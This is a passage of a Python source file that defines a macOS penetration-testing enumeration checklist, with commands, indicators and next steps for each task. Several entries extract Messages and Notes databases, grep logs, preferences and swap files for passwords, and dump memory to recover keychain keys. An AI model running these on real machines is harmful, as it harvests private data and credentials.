                            'Permission denied',
                            'No messages found'
                        ],
                        'next_steps': [
                            'Check attachment table: SELECT * FROM attachment',
                            'Review deleted messages table',
                            'Extract email snippets database'
                        ],
                        'alternatives': [
                            'Manual: sqlite3 ~/Library/Messages/chat.db .tables',
                            'Manual: sqlite3 ~/Library/Messages/chat.db "SELECT * FROM attachment"',
                            'Manual: sqlite3 ~/Suggestions/snippets.db "SELECT * FROM emailSnippets"'
                        ],
                        'notes': 'Messages stored in SQLite. Tables: message, attachment, deleted_messages. Check for sensitive data in conversations'
                    }
                },
                {
                    'id': f'notes-extraction-{target}',
                    'name': 'Extract Notes Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'for i in $(sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile(\'/tmp/note_$i.gz\', ZDATA) from ZICNOTEDATA where Z_PK = \'$i\';"; zcat /tmp/note_$i.gz 2>/dev/null; done',
                        'description': 'Extract and decompress Notes app data',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'group.com.apple.notes/NoteStore.sqlite': 'Notes database',
                            'ZICNOTEDATA': 'Note content table',
                            'writefile': 'SQLite function to write blob',
                            'zcat': 'Decompress gzip data'
                        },
                        'success_indicators': [
                            'Notes extracted',
                            'Content decompressed',
                            'Text readable'
                        ],
                        'failure_indicators': [
                            'Database not found',
                            'Decompression failed',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Search for passwords in notes',
                            'Review sensitive information',
                            'Check note attachments'
                        ],
                        'alternatives': [
                            'Manual: sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite .tables',
                            'Manual: strings NoteStore.sqlite | grep -i password',
                            'Tool: Export notes via Notes.app'
                        ],
                        'notes': 'Notes stored compressed in SQLite. ZDATA column contains gzipped content. Extract and decompress to read'
                    }
                },
                {
                    'id': f'preferences-enum-{target}',
                    'name': 'Enumerate Application Preferences',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la ~/Library/Preferences/*.plist | head -50',
                        'description': 'List application preference files (may contain credentials)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '~/Library/Preferences': 'User application preferences',
                            '*.plist': 'Property list files',
                            'head -50': 'First 50 files'
                        },
                        'success_indicators': [
                            'Preference files listed',
                            'Application configurations found',
                            'Bundle IDs shown'
                        ],
                        'failure_indicators': [
                            'Directory not accessible',
                            'No preferences found'
                        ],
                        'next_steps': [
                            'Read plists: defaults read ~/Library/Preferences/com.app.plist',
                            'Search for credentials in preferences',
                            'Check LaunchServices.QuarantineEventsV2'
                        ],
                        'alternatives': [
                            'Manual: defaults read ~/Library/Preferences/com.apple.screensaver',
                            'Manual: plutil -p ~/Library/Preferences/*.plist',
                            'Manual: grep -r password ~/Library/Preferences'
                        ],
                        'notes': 'Preferences can be XML or binary plists. Use defaults or plutil to read. May contain passwords, tokens, API keys'
                    }
                },
                {
                    'id': f'log-files-{target}',
                    'name': 'Review macOS Log Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /var/log/*.log ~/Library/Logs/*.log 2>/dev/null | head -50',
                        'description': 'List system and user log files',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '/var/log': 'System log directory',
                            '~/Library/Logs': 'User application logs',
                            '*.log': 'Log file extension'
                        },
                        'success_indicators': [
                            'Log files found',
                            'System logs accessible',
                            'Application logs listed'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Logs rotated/deleted'
                        ],
                        'next_steps': [
                            'Review system.log: tail -100 /var/log/system.log',
                            'Check DiskUtility.log for USB info',
                            'Search logs for sensitive data'
                        ],
                        'alternatives': [
                            'Manual: tail -100 /var/log/system.log',
                            'Manual: log show --predicate "processImagePath contains \'ssh\'" --last 1h',
                            'Manual: grep -i password /var/log/*.log'
                        ],
                        'notes': 'Key logs: system.log (main), asl/*.asl (Apple System Logs), DiskUtility.log (drives), install.log (installations)'
                    }
                }
            ]
        })

        # Mach-O Binary Analysis
        tasks['children'].append({
            'id': f'macho-analysis-{target}',
            'name': 'Mach-O Binary Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'universal-binaries-{target}',
                    'name': 'Identify Universal Binaries',
                    'type': 'command',
                    'metadata': {
                        'command': 'file /bin/* /usr/bin/* 2>/dev/null | grep "universal binary" | head -50',
                        'description': 'Find universal binaries (multiple architectures)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'file': 'Determine file type',
                            'universal binary': 'Multiple architecture support',
                            'grep': 'Filter for universal binaries'
                        },
                        'success_indicators': [
                            'Universal binaries found',
                            'Architectures listed (x86_64, arm64)',
                            'Multiple archs confirmed'
                        ],
                        'failure_indicators': [
                            'No universal binaries',
                            'Single architecture only'
                        ],
                        'next_steps': [
                            'Check architectures: lipo -info /path/binary',
                            'Extract architecture: lipo -thin arm64 binary -output binary_arm64',
                            'Analyze with otool or Hopper'
                        ],
                        'alternatives': [
                            'Manual: lipo -info /bin/ls',
                            'Manual: otool -f -v /bin/ls (Fat header)',
                            'Manual: file /Applications/*.app/Contents/MacOS/*'
                        ],
                        'notes': 'Universal binaries contain multiple architectures (Intel + Apple Silicon). Identified by FAT_MAGIC (0xcafebabe). Roughly doubles size'
                    }
                },
                {
                    'id': f'macho-headers-{target}',
                    'name': 'Analyze Mach-O Headers',
                    'type': 'command',
                    'metadata': {
                        'command': 'otool -hv /bin/ls',
                        'description': 'Display Mach-O header (magic, filetype, flags)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'otool': 'Object file display tool',
                            '-h': 'Display Mach-O header',
                            '-v': 'Verbose output'
                        },
                        'success_indicators': [
                            'Mach-O header displayed',
                            'Magic number shown (MH_MAGIC_64)',
                            'File type identified (EXECUTE, DYLIB)',
                            'Flags listed (PIE, NOUNDEFS)'
                        ],
                        'failure_indicators': [
                            'Not a Mach-O file',
                            'Unsupported architecture'
                        ],
                        'next_steps': [
                            'Check for PIE (Position Independent Executable)',
                            'Review flags: MH_NO_HEAP_EXECUTION, MH_ALLOW_STACK_EXECUTION',
                            'Identify file type: MH_EXECUTE, MH_DYLIB, MH_BUNDLE'
                        ],
                        'alternatives': [
                            'Manual: otool -arch arm64e -hv /bin/ls (specific arch)',
                            'Manual: file /bin/ls (basic info)',
                            'Tool: Mach-O View (GUI)'
                        ],
                        'notes': 'Header contains magic (0xfeedfacf for 64-bit), cputype, filetype. Flags: PIE (ASLR), NOUNDEFS (fully linked)'
                    }
                },
                {
                    'id': f'load-commands-{target}',
                    'name': 'List Load Commands',
                    'type': 'command',
                    'metadata': {
                        'command': 'otool -lv /bin/ls | head -200',
                        'description': 'Display load commands (segments, dylibs, entrypoint)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-l': 'Display load commands',
                            '-v': 'Verbose output',
                            'head -200': 'First 200 lines'
                        },
                        'success_indicators': [
                            'Load commands listed',
                            'LC_SEGMENT_64 shown',
                            'LC_LOAD_DYLIB listed',
                            'LC_MAIN or LC_UNIXTHREAD found'
                        ],
                        'failure_indicators': [
                            'Not a Mach-O file',
                            'Corrupted binary'
                        ],
                        'next_steps': [
                            'Review linked libraries (LC_LOAD_DYLIB)',
                            'Check entrypoint (LC_MAIN)',
                            'Identify segments: __TEXT, __DATA, __LINKEDIT',
                            'Check for LC_ENCRYPTION_INFO (encrypted binary)'
                        ],
                        'alternatives': [
                            'Manual: otool -L /bin/ls (just dylibs)',
                            'Manual: size -m /bin/ls (segment sizes)',
                            'Tool: Mach-O View (visual inspection)'
                        ],
                        'notes': 'Load commands: LC_SEGMENT_64 (memory layout), LC_LOAD_DYLIB (dependencies), LC_MAIN (entrypoint), LC_CODE_SIGNATURE (signature offset)'
                    }
                },
                {
                    'id': f'dylib-deps-{target}',
                    'name': 'List Dynamic Library Dependencies',
                    'type': 'command',
                    'metadata': {
                        'command': 'otool -L /bin/ls',
                        'description': 'Show linked dynamic libraries (potential malware indicators)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '-L': 'List shared library dependencies',
                            'otool': 'Object file tool'
                        },
                        'success_indicators': [
                            'Dylib paths listed',
                            'Compatibility versions shown',
                            'System libraries identified'
                        ],
                        'failure_indicators': [
                            'No libraries (static binary)',
                            'Missing dependencies'
                        ],
                        'next_steps': [
                            'Check for suspicious dylibs',
                            'Review: DiskArbitration (USB), AVFoundation (audio/video), CoreWLAN (WiFi)',
                            'Verify dylib signatures: codesign -v /path/to.dylib'
                        ],
                        'alternatives': [
                            'Manual: otool -lv /bin/ls | grep LC_LOAD_DYLIB -A5',
                            'Manual: nm -g /usr/lib/libSystem.B.dylib (symbols)',
                            'Tool: dyld_info -dependents /bin/ls'
                        ],
                        'notes': 'Malware indicators: DiskArbitration (USB monitoring), AVFoundation (A/V capture), CoreWLAN (WiFi scans). Check /usr/lib for system dylibs'
                    }
                },
                {
                    'id': f'code-signature-{target}',
                    'name': 'Verify Code Signatures',
                    'type': 'command',
                    'metadata': {
                        'command': 'codesign -dv --verbose=4 /Applications/*.app 2>&1 | head -100',
                        'description': 'Display code signature details (developer, entitlements)',
                        'tags': ['OSCP:HIGH', 'MACOS'],
                        'flag_explanations': {
                            'codesign': 'Code signing tool',
                            '-d': 'Display signature',
                            '-v': 'Verify signature',
                            '--verbose=4': 'Maximum verbosity'
                        },
                        'success_indicators': [
                            'Signature valid',
                            'Developer ID shown',
                            'Authority chain displayed',
                            'Entitlements listed'
                        ],
                        'failure_indicators': [
                            'Code object is not signed',
                            'Invalid signature',
                            'Signature verification failed'
                        ],
                        'next_steps': [
                            'Extract entitlements: codesign -d --entitlements :- app',
                            'Check for ad-hoc signatures (no developer)',
                            'Verify against Gatekeeper'
                        ],
                        'alternatives': [
                            'Manual: codesign -dv /path/to/binary',
                            'Manual: codesign --verify --verbose /Applications/Safari.app',
                            'Manual: spctl -a -v /Applications/App.app (Gatekeeper check)'
                        ],
                        'notes': 'Code signatures contain developer ID, entitlements, hash. LC_CODE_SIGNATURE points to signature blob at end of file'
                    }
                },
                {
                    'id': f'entitlements-{target}',
                    'name': 'Extract Binary Entitlements',
                    'type': 'command',
                    'metadata': {
                        'command': 'codesign -d --entitlements :- /Applications/*.app 2>&1 | head -200',
                        'description': 'Extract entitlements (capabilities, sandbox exceptions)',
                        'tags': ['OSCP:HIGH', 'MACOS'],
                        'flag_explanations': {
                            '--entitlements :-': 'Output entitlements to stdout',
                            'entitlements': 'Permission grants and capabilities'
                        },
                        'success_indicators': [
                            'Entitlements XML displayed',
                            'Capabilities listed',
                            'Sandbox exceptions shown'
                        ],
                        'failure_indicators': [
                            'No entitlements',
                            'Not signed'
                        ],
                        'next_steps': [
                            'Review dangerous entitlements: com.apple.security.get-task-allow',
                            'Check sandbox exceptions',
                            'Identify privilege escalation opportunities'
                        ],
                        'alternatives': [
                            'Manual: jtool --ent /path/binary',
                            'Manual: ldid -e /path/binary (iOS)',
                            'Manual: security dump-entitlements binary'
                        ],
                        'notes': 'Entitlements grant capabilities (camera, contacts) and sandbox exceptions. Part of code signature'
                    }
                }
            ]
        })

        # Package Installer Analysis
        tasks['children'].append({
            'id': f'installer-analysis-{target}',
            'name': 'Package Installer Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'pkg-decompress-{target}',
                    'name': 'Decompress Package Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'pkgutil --expand package.pkg /tmp/pkg_extracted',
                        'description': 'Extract .pkg installer contents for analysis',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'pkgutil': 'Package management utility',
                            '--expand': 'Extract package contents',
                            'package.pkg': 'Installer package file'
                        },
                        'success_indicators': [
                            'Package extracted',
                            'Distribution.xml found',
                            'PackageInfo found',
                            'Scripts directory extracted'
                        ],
                        'failure_indicators': [
                            'Invalid package format',
                            'Extraction failed'
                        ],
                        'next_steps': [
                            'Review Distribution.xml for JavaScript',
                            'Check PackageInfo for install location',
                            'Analyze pre/post install scripts',
                            'Extract Payload: cat Payload | gzip -dc | cpio -i'
                        ],
                        'alternatives': [
                            'Manual: xar -xf package.pkg (older method)',
                            'Manual: cat Scripts | gzip -dc | cpio -i (extract scripts)',
                            'Tool: Suspicious Package (GUI)'
                        ],
                        'notes': 'Pkg structure: Distribution (customization), PackageInfo (requirements), Scripts (pre/post install), Payload (files), BOM (file list)'
                    }
                },
                {
                    'id': f'pkg-scripts-{target}',
                    'name': 'Analyze Installer Scripts',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /tmp/pkg_extracted/Scripts | gzip -dc | cpio -i && find /tmp/pkg_extracted -name "preinstall" -o -name "postinstall" -exec cat {} \\;',
                        'description': 'Extract and review pre/post installation scripts (privesc vectors)',
                        'tags': ['OSCP:HIGH', 'MACOS', 'PRIVESC'],
                        'flag_explanations': {
                            'gzip -dc': 'Decompress gzip',
                            'cpio -i': 'Extract cpio archive',
                            'preinstall': 'Script run before installation',
                            'postinstall': 'Script run after installation'
                        },
                        'success_indicators': [
                            'Scripts extracted',
                            'Pre/post install scripts found',
                            'Script contents displayed'
                        ],
                        'failure_indicators': [
                            'No scripts found',
                            'Decompression failed'
                        ],
                        'next_steps': [
                            'Check for execution from /var/tmp (writable)',
                            'Look for AuthorizationExecuteWithPrivileges calls',
                            'Identify modifiable script paths (privesc)'
                        ],
                        'alternatives': [
                            'Manual: cat Scripts | gzip -dc | cpio -t (list files)',
                            'Manual: grep -r "AuthorizationExecuteWithPrivileges" Scripts',
                            'Manual: strings Scripts | grep -i "/tmp"'
                        ],
                        'notes': 'Scripts run as root. Privesc: modifiable scripts, execution from writable dirs (/var/tmp), AuthorizationExecuteWithPrivileges abuse'
                    }
                },
                {
                    'id': f'dmg-mount-{target}',
                    'name': 'Mount DMG Disk Images',
                    'type': 'command',
                    'metadata': {
                        'command': 'hdiutil attach image.dmg',
                        'description': 'Mount Apple Disk Image for inspection',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'hdiutil': 'Disk image utility',
                            'attach': 'Mount disk image',
                            'image.dmg': 'Apple Disk Image file'
                        },
                        'success_indicators': [
                            'DMG mounted',
                            'Mount point displayed',
                            'Contents accessible in /Volumes'
                        ],
                        'failure_indicators': [
                            'Image verification failed',
                            'Password required',
                            'Unsupported format'
                        ],
                        'next_steps': [
                            'Explore mounted volume: ls /Volumes',
                            'Check for malicious applications',
                            'Unmount: hdiutil detach /Volumes/VolumeName'
                        ],
                        'alternatives': [
                            'Manual: hdiutil info (list mounted images)',
                            'Manual: hdiutil detach /dev/diskX (unmount)',
                            'Manual: diskutil list (show mounted volumes)'
                        ],
                        'notes': 'DMG files are mountable disk images. Support many formats (some had kernel exploits). Mount to /Volumes. Check for .app and installer scripts'
                    }
                }
            ]
        })

        # Memory Artifacts
        tasks['children'].append({
            'id': f'memory-artifacts-{target}',
            'name': 'Memory Artifact Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'swap-files-{target}',
                    'name': 'Check Swap Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lh /private/var/vm/swapfile*',
                        'description': 'List swap files (contain paged-out memory)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '/private/var/vm/swapfile*': 'Swap file pattern',
                            '-h': 'Human-readable sizes'
                        },
                        'success_indicators': [
                            'Swap files listed',
                            'File sizes shown',
                            'Multiple swapfiles found'
                        ],
                        'failure_indicators': [
                            'No swap files',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Search for credentials: strings swapfile0 | grep -i password',
                            'Extract sensitive data from swap',
                            'Check swap usage: sysctl vm.swapusage'
                        ],
                        'alternatives': [
                            'Manual: sudo strings /private/var/vm/swapfile0 | less',
                            'Manual: sysctl vm.swapusage (swap statistics)',
                            'Manual: grep -a "password" /private/var/vm/swapfile0'
                        ],
                        'notes': 'Swap files cache physical memory overflow. Can contain passwords, keys. Multiple files: swapfile0, swapfile1, etc.'
                    }
                },
                {
                    'id': f'sleepimage-{target}',
                    'name': 'Check Hibernate Sleep Image',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lh /private/var/vm/sleepimage && sysctl vm.swapusage',
                        'description': 'Check hibernate sleep image (encrypted on modern macOS)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '/private/var/vm/sleepimage': 'Hibernation memory dump',
                            'sysctl vm.swapusage': 'Check if encrypted'
                        },
                        'success_indicators': [
                            'Sleep image found',
                            'File size shown',
                            'Encryption status displayed'
                        ],
                        'failure_indicators': [
                            'File not found (no hibernation)',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Check encryption status',
                            'Extract if unencrypted (older macOS)',
                            'Analyze with memory forensics tools'
                        ],
                        'alternatives': [
                            'Manual: pmset -g (power management settings)',
                            'Manual: sudo strings /private/var/vm/sleepimage | less',
                            'Manual: file /private/var/vm/sleepimage'
                        ],
                        'notes': 'Sleepimage stores memory during hibernation. Modern macOS encrypts this. Contains full memory snapshot on wake'
                    }
                },
                {
                    'id': f'memory-dump-{target}',
                    'name': 'Dump Physical Memory (osxpmem)',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo osxpmem.app/osxpmem --format raw -o /tmp/memory.dump',
                        'description': 'Dump physical memory for offline analysis (Intel only)',
                        'tags': ['OSCP:MEDIUM', 'MACOS'],
                        'flag_explanations': {
                            'osxpmem': 'Memory acquisition tool (Google Rekall)',
                            '--format raw': 'Raw memory format',
                            '-o': 'Output file'
                        },
                        'success_indicators': [
                            'Memory dump created',
                            'Kext loaded successfully',
                            'Dump file exists'
                        ],
                        'failure_indicators': [
                            'Kext load failed (check Security & Privacy)',
                            'Apple Silicon not supported',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Analyze with Volatility framework',
                            'Extract keychain master keys',
                            'Search for credentials in memory'
                        ],
                        'alternatives': [
                            'Manual: sudo osxpmem.app/osxpmem -o /tmp/dump.aff4 (AFF4 format)',
                            'Manual: sudo kextload osxpmem.app/MacPmem.kext',
                            'Tool: rekall (memory analysis)'
                        ],
                        'notes': 'osxpmem Intel-only, archived (2017). Requires kext load (allow in Security & Privacy). Use for keychain master key extraction'
                    }
                }
            ]
        })

        # Dyld Shared Cache
        tasks['children'].append({
            'id': f'dyld-cache-{target}',
            'name': 'Dyld Shared Library Cache Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'dyld-location-{target}',
                    'name': 'Locate Dyld Shared Cache',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lh /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/ /System/Library/dyld/ 2>/dev/null',
                        'description': 'Find dyld shared cache (all system dylibs in one file)',
                        'tags': ['OSCP:LOW', 'QUICK_WIN', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/': 'Modern location',
                            '/System/Library/dyld/': 'Legacy location',
                            'dyld_shared_cache': 'Combined dylib file'
                        },
                        'success_indicators': [
                            'Shared cache file found',
                            'Architecture-specific caches listed',
                            'File size shown (large, GB)'
                        ],
                        'failure_indicators': [
                            'File not found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Extract libraries with dyldextractor',
                            'Analyze in Hopper disassembler',
                            'List libraries: dyldex -l cache_path'
                        ],
                        'alternatives': [
                            'Manual: find /System -name "dyld_shared_cache*" 2>/dev/null',
                            'Manual: ls /System/Library/Caches/com.apple.dyld/ (iOS)',
                            'Tool: Hopper (can parse shared cache)'
                        ],
                        'notes': 'Dyld shared cache combines all system frameworks/dylibs for performance. Extract with dyldextractor or parse in Hopper'
                    }
                },
                {
                    'id': f'dyld-extract-{target}',
                    'name': 'Extract Libraries from Shared Cache',
                    'type': 'command',
                    'metadata': {
                        'command': 'dyldex -l /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e | head -100',
                        'description': 'List libraries in dyld shared cache',
                        'tags': ['OSCP:LOW', 'MACOS'],
                        'flag_explanations': {
                            'dyldex': 'Dyld extractor tool (dyldextractor)',
                            '-l': 'List libraries',
                            'head -100': 'First 100 libraries'
                        },
                        'success_indicators': [
                            'Library list displayed',
                            'Framework names shown',
                            'Dylib paths listed'
                        ],
                        'failure_indicators': [
                            'Tool not installed',
                            'Invalid cache file',
                            'Unsupported architecture'
                        ],
                        'next_steps': [
                            'Extract all: dyldex_all cache_path',
                            'Extract specific: dyldex -e libSystem.B.dylib cache_path',
                            'Analyze extracted dylibs with otool/nm'
                        ],
                        'alternatives': [
                            'Manual: dyldex_all cache_path (extract all)',
                            'Tool: dyld_shared_cache_util (deprecated)',
                            'Tool: Hopper (select library from cache)'
                        ],
                        'notes': 'dyldextractor from GitHub (arandomdev). Old dyld_shared_cache_util may not work. Hopper can parse and select libraries from cache'
                    }
                }
            ]
        })

        # File System Metadata
        tasks['children'].append({
            'id': f'fs-metadata-{target}',
            'name': 'File System Metadata Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'ds-store-{target}',
                    'name': 'Find .DS_Store Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name ".DS_Store" 2>/dev/null | head -100',
                        'description': 'Find Finder metadata files (directory attributes)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '.DS_Store': 'Directory attributes and customizations',
                            'find': 'Search filesystem',
                            'head -100': 'Limit results'
                        },
                        'success_indicators': [
                            '.DS_Store files found',
                            'Directory paths listed',
                            'Metadata files accessible'
                        ],
                        'failure_indicators': [
                            'No .DS_Store files',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Parse .DS_Store for directory listing',
                            'Check for exposed web .DS_Store files',
                            'Extract file names from metadata'
                        ],
                        'alternatives': [
                            'Manual: ls -la */.DS_Store',
                            'Manual: strings .DS_Store (extract file names)',
                            'Tool: ds_store parser (Python)'
                        ],
                        'notes': '.DS_Store in every directory with Finder customizations. Can leak file names if exposed on web servers'
                    }
                },
                {
                    'id': f'spotlight-{target}',
                    'name': 'Check Spotlight Metadata',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /.Spotlight-V100/ /Volumes/*/.Spotlight-V100/ 2>/dev/null',
                        'description': 'Check Spotlight index directories',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            '.Spotlight-V100': 'Spotlight index directory',
                            'mdfind': 'Spotlight search command'
                        },
                        'success_indicators': [
                            'Spotlight directories found',
                            'Index files shown',
                            'Volume indexes listed'
                        ],
                        'failure_indicators': [
                            'Spotlight disabled',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Search with mdfind: mdfind "kMDItemKind == Password"',
                            'Check indexing status: mdutil -s /',
                            'Disable indexing: touch /.metadata_never_index'
                        ],
                        'alternatives': [
                            'Manual: mdfind password (search for passwords)',
                            'Manual: mdutil -s / (indexing status)',
                            'Manual: ls -la /.metadata_never_index (check if disabled)'
                        ],
                        'notes': 'Spotlight indexes metadata for fast search. .Spotlight-V100 on each volume. Disable with .metadata_never_index. Use mdfind for searches'
                    }
                },
                {
                    'id': f'vol-access-{target}',
                    'name': 'Access Files via Volume ID',
                    'type': 'command',
                    'metadata': {
                        'command': 'stat /bin/ls | grep -E "^[0-9]+ [0-9]+" | awk \'{print "/.vol/"$1"/"$2}\'',
                        'description': 'Access files via /.vol/VOLID/INODE (bypass path restrictions)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'stat': 'Display file status',
                            '/.vol/': 'Volume access path',
                            'VOLID': 'Volume ID (first number from stat)',
                            'INODE': 'Inode number (second number from stat)'
                        },
                        'success_indicators': [
                            'Volume ID and inode extracted',
                            'Alternate access path created',
                            'File accessible via /.vol'
                        ],
                        'failure_indicators': [
                            'stat failed',
                            '/.vol not accessible'
                        ],
                        'next_steps': [
                            'Access file: cat /.vol/VOLID/INODE',
                            'Bypass path-based restrictions',
                            'Access files with complex paths'
                        ],
                        'alternatives': [
                            'Manual: stat file.txt (get volume ID and inode)',
                            'Manual: cat /.vol/16777223/7545753 (example)',
                            'Manual: ls -i file (get inode)'
                        ],
                        'notes': 'stat output: VOLID INODE perms... Access via /.vol/VOLID/INODE. Useful for bypassing path restrictions or accessing files with special characters'
                    }
                }
            ]
        })

        # LaunchServices Database & File/URL Handlers
        launchservices_task = {
            'id': f'launchservices-analysis-{target}',
            'name': 'LaunchServices Database & Handler Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'launchservices-dump-{target}',
                    'name': 'Dump LaunchServices Database',
                    'type': 'command',
                    'metadata': {
                        'command': '/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | head -500',
                        'description': 'Dump database of all installed applications and their handlers',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS'],
                        'flag_explanations': {
                            'lsregister': 'LaunchServices registration utility',
                            '-dump': 'Dump entire LaunchServices database',
                            'head -500': 'Limit output to first 500 lines (huge database)'
                        },
                        'success_indicators': [
                            'Application listings with paths',
                            'URL scheme bindings visible',
                            'File type associations shown',
                            'UTI (Uniform Type Identifier) mappings'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Empty output',
                            'Tool not available'
                        ],
                        'next_steps': [
                            'Filter for specific URL schemes',
                            'Identify custom protocol handlers',
                            'Map file extensions to applications',
                            'Find apps handling dangerous file types'
                        ],
                        'alternatives': [
                            'lsdtrip (third-party tool from newosxbook.com)',
                            'lsregister -dump | grep -E "path:|bindings:|name:"',
                            'system_profiler SPApplicationsDataType'
                        ],
                        'notes': 'LaunchServices DB tracks all apps, URL schemes, MIME types, file extensions. Brain: /usr/libexec/lsd daemon. Used for "Open With" functionality.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'launchservices-url-schemes-{target}',
                    'name': 'Enumerate URL Scheme Handlers',
                    'type': 'command',
                    'metadata': {
                        'command': '/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -A 5 "bindings:" | grep -E "ftp|http|smb|afp|ssh|vnc" | head -50',
                        'description': 'Find which apps handle network URL schemes',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MACOS'],
                        'flag_explanations': {
                            'bindings:': 'Section showing URL scheme/file type bindings',
                            '-A 5': 'Show 5 lines after match',
                            'ftp|http|smb|afp|ssh|vnc': 'Network protocols of interest'
                        },
                        'success_indicators': [
                            'URL schemes listed with handlers',
                            'Multiple apps for same scheme',
                            'Custom/unusual protocol handlers'
                        ],
                        'failure_indicators': [
                            'No bindings found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Test URL scheme injection attacks',
                            'Check for vulnerable protocol handlers',
                            'Identify default handlers for exploitation',
                            'Research CVEs for specific handlers'
                        ],
                        'alternatives': [
                            'swda getSchemes (SwiftDefaultApps tool)',
                            'swda getHandler --URL ftp',
                            'defaults read ~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist'
                        ],
                        'notes': 'URL schemes exploitable: http(s), ftp, smb, afp, ssh, vnc, file, tel, facetime, etc. Custom schemes may have command injection.',
                        'estimated_time': '20 seconds'
                    }
                },
                {
                    'id': f'launchservices-file-extensions-{target}',
                    'name': 'Map File Extensions to Applications',
                    'type': 'command',
                    'metadata': {
                        'command': '/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E "path:|bindings:|name:" | head -100',
                        'description': 'Map file extensions to handling applications',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS'],
                        'flag_explanations': {
                            'path:': 'Application installation path',
                            'name:': 'Application display name',
                            'bindings:': 'File extensions/URL schemes handled'
                        },
                        'success_indicators': [
                            'Application paths listed',
                            'File extension bindings visible',
                            'Handler hierarchy shown'
                        ],
                        'failure_indicators': [
                            'Incomplete output',
                            'Missing bindings section'
                        ],
                        'next_steps': [
                            'Check which apps handle .sh, .command, .app',
                            'Identify apps handling office docs (phishing)',
                            'Find apps with custom extension handlers',
                            'Test file type confusion attacks'
                        ],
                        'alternatives': [
                            'swda getUTIs (list all Uniform Type Identifiers)',
                            'swda getApps (list all declared apps)',
                            'mdls file.ext (show file metadata including UTI)'
                        ],
                        'notes': 'File extensions map to UTIs (Uniform Type Identifiers). Multiple apps can handle same extension. Default set in com.apple.LaunchServices plist.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'check-app-supported-types-{target}',
                    'name': 'Check App Supported File Types',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate file types supported by specific application',
                        'tags': ['OSCP:LOW', 'ENUM', 'MACOS'],
                        'alternatives': [
                            'cd /Applications/Safari.app/Contents',
                            'grep -A3 CFBundleTypeExtensions Info.plist | grep string',
                            '',
                            '# Example Safari output:',
                            '# <string>css</string>',
                            '# <string>pdf</string>',
                            '# <string>html</string>',
                            '# <string>js</string>',
                            '# <string>jpg</string>',
                            '',
                            '# For any app:',
                            'plutil -p /Applications/App.app/Contents/Info.plist | grep -A 10 CFBundleTypeExtensions'
                        ],
